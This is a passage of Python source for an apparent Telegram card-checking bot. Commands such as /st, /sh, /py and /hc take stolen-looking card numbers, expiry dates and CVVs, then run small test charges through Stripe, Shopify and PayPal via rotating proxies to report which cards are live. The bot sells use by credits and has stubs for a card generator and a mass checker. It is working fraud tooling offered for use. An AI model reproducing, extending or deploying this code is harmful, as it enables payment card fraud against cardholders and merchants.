                f"📅 Exp: `{mm}/{yy}`\n"
                f"💰 Amount: <code>$0.98</code>\n"
                f"🎯 Status: <code>CHARGED ✅</code>\n"
                f"🔧 Gateway: Shopify",
                parse_mode='HTML'
            )
        elif status == "declined":
            await msg.edit_text(
                f"❌ <b>SHOPIFY CHARGE DECLINED</b>\n\n"
                f"💳 Card: <code>{card[:6]}******{card[-4:]}</code>\n"
                f"🎯 Status: <code>DECLINED ❌</code>",
                parse_mode='HTML'
            )
        else:
            await msg.edit_text(f"⚠️ API Error: {response[:100]}")
            
    except Exception as e:
        logger.error(f"Error in /sh command: {e}")
        await update.message.reply_text("❌ An error occurred!")

async def st_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe 1$ command"""
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /st card|mm|yy|cvv")
            return
        
        text = context.args[0]
        parts = []
        if '|' in text:
            parts = text.split('|')
        elif '/' in text:
            parts = text.split('/')
        else:
            parts = text.split()
        
        if len(parts) < 4:
            await update.message.reply_text("❌ Invalid format!")
            return
        
        card = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        msg = await update.message.reply_text("🔍 Charging 1$ with Stripe...")
        
        status, response = await check_stripe_api(card, mm, yy, cvv, gateway_type="stripe_charge_1")
        
        if status == "approved":
            await msg.edit_text(
                f"✅ *STRIPE CHARGE SUCCESS*\n\n"
                f"💳 Card: `{card[:6]}******{card[-4:]}`\n"
                f"📅 Exp: `{mm}/{yy}`\n"
                f"💰 Amount: <code>$1.00</code>\n"
                f"🎯 Status: <code>CHARGED ✅</code>\n"
                f"🔧 Gateway: Stripe",
                parse_mode='HTML'
            )
        elif status == "declined":
            await msg.edit_text(
                f"❌ <b>STRIPE CHARGE DECLINED</b>\n\n"
                f"💳 Card: <code>{card[:6]}******{card[-4:]}</code>\n"
                f"🎯 Status: <code>DECLINED ❌</code>",
                parse_mode='HTML'
            )
        else:
            await msg.edit_text(f"⚠️ API Error: {response[:100]}")
            
    except Exception as e:
        logger.error(f"Error in /st command: {e}")
        await update.message.reply_text("❌ An error occurred!")

async def st1_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe 3$ command"""
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /st1 card|mm|yy|cvv")
            return
        
        text = context.args[0]
        parts = []
        if '|' in text:
            parts = text.split('|')
        elif '/' in text:
            parts = text.split('/')
        else:
            parts = text.split()
        
        if len(parts) < 4:
            await update.message.reply_text("❌ Invalid format!")
            return
        
        card = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        msg = await update.message.reply_text("🔍 Charging 3$ with Stripe...")
        
        status, response = await check_stripe_api(card, mm, yy, cvv, gateway_type="stripe_charge_3")
        
        if status == "approved":
            await msg.edit_text(
                f"✅ *STRIPE CHARGE SUCCESS*\n\n"
                f"💳 Card: `{card[:6]}******{card[-4:]}`\n"
                f"📅 Exp: `{mm}/{yy}`\n"
                f"💰 Amount: <code>$3.00</code>\n"
                f"🎯 Status: <code>CHARGED ✅</code>\n"
                f"🔧 Gateway: Stripe",
                parse_mode='HTML'
            )
        elif status == "declined":
            await msg.edit_text(
                f"❌ <b>STRIPE CHARGE DECLINED</b>\n\n"
                f"💳 Card: <code>{card[:6]}******{card[-4:]}</code>\n"
                f"🎯 Status: <code>DECLINED ❌</code>",
                parse_mode='HTML'
            )
        else:
            await msg.edit_text(f"⚠️ API Error: {response[:100]}")
            
    except Exception as e:
        logger.error(f"Error in /st1 command: {e}")
        await update.message.reply_text("❌ An error occurred!")

async def py_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PayPal 9$ command"""
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /py card|mm|yy|cvv")
            return
        
        text = context.args[0]
        parts = []
        if '|' in text:
            parts = text.split('|')
        elif '/' in text:
            parts = text.split('/')
        else:
            parts = text.split()
        
        if len(parts) < 4:
            await update.message.reply_text("❌ Invalid format!")
            return
        
        card = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        msg = await update.message.reply_text("🔍 Charging 9$ with PayPal...")
        
        status, response = await check_paypal_api(card, mm, yy, cvv, amount_type="9")
        
        if status == "approved":
            await msg.edit_text(
                f"✅ *PAYPAL CHARGE SUCCESS*\n\n"
                f"💳 Card: `{card[:6]}******{card[-4:]}`\n"
                f"📅 Exp: `{mm}/{yy}`\n"
                f"💰 Amount: <code>$9.00</code>\n"
                f"🎯 Status: <code>CHARGED ✅</code>\n"
                f"🔧 Gateway: PayPal",
                parse_mode='HTML'
            )
        elif status == "declined":
            await msg.edit_text(
                f"❌ <b>PAYPAL CHARGE DECLINED</b>\n\n"
                f"💳 Card: <code>{card[:6]}******{card[-4:]}</code>\n"
                f"🎯 Status: <code>DECLINED ❌</code>",
                parse_mode='HTML'
            )
        else:
            await msg.edit_text(f"⚠️ API Error: {response[:100]}")
            
    except Exception as e:
        logger.error(f"Error in /py command: {e}")
        await update.message.reply_text("❌ An error occurred!")

async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PayPal 1$ command"""
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /pp card|mm|yy|cvv")
            return
        
        text = context.args[0]
        parts = []
        if '|' in text:
            parts = text.split('|')
        elif '/' in text:
            parts = text.split('/')
        else:
            parts = text.split()
        
        if len(parts) < 4:
            await update.message.reply_text("❌ Invalid format!")
            return
        
        card = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        msg = await update.message.reply_text("🔍 Charging 1$ with PayPal...")
        
        status, response = await check_paypal_api(card, mm, yy, cvv, amount_type="1")
        
        if status == "approved":
            await msg.edit_text(
                f"✅ *PAYPAL CHARGE SUCCESS*\n\n"
                f"💳 Card: `{card[:6]}******{card[-4:]}`\n"
                f"📅 Exp: `{mm}/{yy}`\n"
                f"💰 Amount: <code>$1.00</code>\n"
                f"🎯 Status: <code>CHARGED ✅</code>\n"
                f"🔧 Gateway: PayPal",
                parse_mode='HTML'
            )
        elif status == "declined":
            await msg.edit_text(
                f"❌ <b>PAYPAL CHARGE DECLINED</b>\n\n"
                f"💳 Card: <code>{card[:6]}******{card[-4:]}</code>\n"
                f"🎯 Status: <code>DECLINED ❌</code>",
                parse_mode='HTML'
            )
        else:
            await msg.edit_text(f"⚠️ API Error: {response[:100]}")
            
    except Exception as e:
        logger.error(f"Error in /pp command: {e}")
        await update.message.reply_text("❌ An error occurred!")

async def at_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """AuthNet 1$ command"""
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        await update.message.reply_text("🔄 AuthNet command is currently being updated...")
    except Exception as e:
        logger.error(f"Error in /at command: {e}")
        await update.message.reply_text("❌ An error occurred!")

async def ad_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Adyen 1$ command"""
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        await update.message.reply_text("🔄 Adyen command is currently being updated...")
    except Exception as e:
        logger.error(f"Error in /ad command: {e}")
        await update.message.reply_text("❌ An error occurred!")

async def oc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ocean 4$ command"""
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        await update.message.reply_text("🔄 Ocean Payments command is currently being updated...")
    except Exception as e:
        logger.error(f"Error in /oc command: {e}")
        await update.message.reply_text("❌ An error occurred!")

async def hc_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify 10$ command"""
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /hc card|mm|yy|cvv")
            return
        
        text = context.args[0]
        parts = []
        if '|' in text:
            parts = text.split('|')
        elif '/' in text:
            parts = text.split('/')
        else:
            parts = text.split()
        
        if len(parts) < 4:
            await update.message.reply_text("❌ Invalid format!")
            return
        
        card = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvv = parts[3].strip()
        
        msg = await update.message.reply_text("🔍 Charging 10$ with Shopify...")
        
        status, response = await check_shopify_api(card, mm, yy, cvv, amount_type="10")
        
        if status == "approved":
            await msg.edit_text(
                f"✅ *SHOPIFY CHARGE SUCCESS*\n\n"
                f"💳 Card: `{card[:6]}******{card[-4:]}`\n"
                f"📅 Exp: `{mm}/{yy}`\n"
                f"💰 Amount: <code>$10.00</code>\n"
                f"🎯 Status: <code>CHARGED ✅</code>\n"
                f"🔧 Gateway: Shopify",
                parse_mode='HTML'
            )
        elif status == "declined":
            await msg.edit_text(
                f"❌ <b>SHOPIFY CHARGE DECLINED</b>\n\n"
                f"💳 Card: <code>{card[:6]}******{card[-4:]}</code>\n"
                f"🎯 Status: <code>DECLINED ❌</code>",
                parse_mode='HTML'
            )
        else:
            await msg.edit_text(f"⚠️ API Error: {response[:100]}")
            
    except Exception as e:
        logger.error(f"Error in /hc command: {e}")
        await update.message.reply_text("❌ An error occurred!")

# === OTHER COMMANDS ===
async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        await update.message.reply_text("🔄 Card generator is currently being updated...")
    except Exception as e:
        logger.error(f"Error in /gen command: {e}")
        await update.message.reply_text("❌ An error occurred.")

async def mass_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        await update.message.reply_text("🔄 Mass checker is currently being updated...")
    except Exception as e:
        logger.error(f"Error in /mass command: {e}")
        await update.message.reply_text("❌ An error occurred.")

async def open_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        await update.message.reply_text("🔄 File opener is currently being updated...")
    except Exception as e:
        logger.error(f"Error in /open command: {e}")
        await update.message.reply_text("❌ An error occurred.")

async def rz_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not consume_credit(user.id):
            await update.message.reply_text("❌ You don't have enough credits.")
            return
        
        await update.message.reply_text("🔄 Razorpay 1₹ command is currently being updated...")
    except Exception as e:
        logger.error(f"Error in /rz command: {e}")
        await update.message.reply_text("❌ An error occurred.")

async def seturl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        
        # Check if user is banned
        user_data = get_user(user.id)
        if user_data and user_data.get('is_banned'):
            await update.message.reply_text("❌ You are banned from using this bot!")
            return
        
        if not await enforce_cooldown(user.id, update):
            return
        
        if not context.args:
            await update.message.reply_text("❌ Usage: /seturl <site_url>")
            return
        
        site_url = context.args[0].strip()
        if not site_url.startswith(('http://', 'https://')):
            site_url = 'https://' + site_url
        
        await update.message.reply_text(f"✅ Shopify site updated to: {site_url}")
    except Exception as e:
        logger.error(f"Error in /seturl command: {e}")
        await update.message.reply_text("❌ An error occurred.")

# === ERROR HANDLER ===
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Log Errors caused by Updates."""
    logger.error(f"Exception while handling an update: {context.error}")
    
    if update and hasattr(update, 'callback_query') and update.callback_query:
        try:
            await update.callback_query.answer("⚠️ An error occurred. Please try again.", show_alert=True)
        except:
            pass

# === MAIN FUNCTION - FIXED VERSION ===
def main():
    try:
        # Initialize database
        init_db()
        logger.info("✅ Database initialized successfully!")
        logger.info("✅ Proxy configuration loaded!")
        logger.info(f"✅ Static proxies: {len(static_proxies)}")
        logger.info(f"✅ Rotation proxies: {len(rotation_proxies)}")
        
        # IMPORT FIX: Import ApplicationBuilder directly to avoid corrupted module
        try:
            # Try direct import first
            from telegram.ext._applicationbuilder import ApplicationBuilder as AppBuilder
            logger.info("✅ Using direct import for ApplicationBuilder")
            application = AppBuilder().token(TOKEN).build()
        except Exception as e:
            # Fallback to regular import
            logger.info("⚠️ Using regular import for ApplicationBuilder")
            from telegram.ext import ApplicationBuilder
            application = ApplicationBuilder().token(TOKEN).build()
        
        # Add middleware handler
        application.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, group_filter), group=-1)
        
        # Basic commands
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("info", info))
        application.add_handler(CommandHandler("credits", credits_command))
        application.add_handler(CommandHandler("redeem", redeem_command))
        
        # Admin commands
        application.add_handler(CommandHandler("admin", admin_command))
        application.add_handler(CommandHandler("adcr", adcr_command))
        application.add_handler(CommandHandler("adduser", adduser_command))
        application.add_handler(CommandHandler("ban", ban_command))
        application.add_handler(CommandHandler("unban", unban_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("topusers", topusers_command))
        application.add_handler(CommandHandler("allusers", allusers_command))
        application.add_handler(CommandHandler("broadcast", broadcast_command))
        application.add_handler(CommandHandler("backup", backup_command))
        application.add_handler(CommandHandler("gencode", gencode_command))
        application.add_handler(CommandHandler("listcodes", listcodes_command))
        application.add_handler(CommandHandler("close", close_command))
        application.add_handler(CommandHandler("restart", restart_command))
        
        # Gateway commands
        application.add_handler(CommandHandler("chk", chk_command))
        application.add_handler(CommandHandler("st", st_command))
        application.add_handler(CommandHandler("st1", st1_command))
        application.add_handler(CommandHandler("sh", sh_command))
        application.add_handler(CommandHandler("hc", hc_command))
        application.add_handler(CommandHandler("rz", rz_command))
        application.add_handler(CommandHandler("seturl", seturl))
        application.add_handler(CommandHandler("py", py_command))
        application.add_handler(CommandHandler("pp", pp_command))
        application.add_handler(CommandHandler("at", at_command))
        application.add_handler(CommandHandler("ad", ad_command))
        application.add_handler(CommandHandler("oc", oc_command))
        
        # Other commands
        application.add_handler(CommandHandler("gen", gen))
        application.add_handler(CommandHandler("mass", mass_handler))
        application.add_handler(CommandHandler("open", open_command))
        application.add_handler(CommandHandler("sp", autoshopify_gate_handler))
        
        # Callback handlers
        application.add_handler(CallbackQueryHandler(handle_callback))
        application.add_error_handler(error_handler)
        
        logger.info(f"🤖 Bot is starting...")
        logger.info(f"📊 Owner ID: {OWNER_ID}")
        logger.info(f"🔗 Group Link: {OFFICIAL_GROUP_LINK}")
        logger.info(f"🔧 Static Proxies: {len(static_proxies)}")
        logger.info(f"🔄 Rotation Proxies: {len(rotation_proxies)}")
        logger.info(f"✅ All handlers registered successfully!")
        
        # FIX: Start polling with proper error handling
        logger.info(f"🔄 Starting polling...")
        
        try:
            application.run_polling(
                drop_pending_updates=True,
                timeout=30
            )
        except KeyboardInterrupt:
            logger.info(f"👋 Bot stopped by user")
        except Exception as e:
            logger.error(f"❌ Polling failed: {e}")
            raise
    
    except Exception as e:
        logger.error(f"❌ Failed to initialize bot: {e}")

if __name__ == "__main__":
    main()